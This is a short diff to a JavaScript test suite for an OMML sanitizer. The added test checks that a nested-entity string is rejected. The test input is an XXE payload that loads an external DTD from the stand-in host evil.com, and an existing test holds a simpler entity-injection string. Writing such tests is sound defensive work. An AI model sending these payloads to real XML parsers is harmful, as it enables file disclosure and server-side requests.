@@ -39,4 +39,9 @@ describe('OMML Sanitizer', () => {
     const omml2 = '<!enTiTy xxe "evil"><m:oMath></m:oMath>'
     expect(sanitizeOmml(omml2)).toBe('')
   })
+
+  it('should reject strings with nested entities', () => {
+    const omml = '<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]><m:oMath></m:oMath>'
+    expect(sanitizeOmml(omml)).toBe('')
+  })
 })
